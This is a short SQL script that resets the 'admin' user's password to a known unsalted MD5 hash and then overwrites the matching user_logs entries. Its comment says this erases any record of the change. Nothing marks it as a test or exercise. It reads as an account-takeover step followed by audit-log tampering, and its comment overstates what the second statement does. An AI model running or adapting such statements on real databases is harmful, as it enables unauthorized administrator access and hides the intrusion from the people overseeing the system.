-- Alter password to 'oops!' via MD5 Hash generator
UPDATE "users"
SET "password" = '982c0381c279d139fd221fce974916e7'
WHERE "username" = 'admin';

-- Erase any logs of the above password change recorded by the database
UPDATE "user_logs"
SET "new_password" = '44bf025d27eea66336e5c1133c3827f7'
WHERE "old_username" = 'admin' AND "type" = 'update';
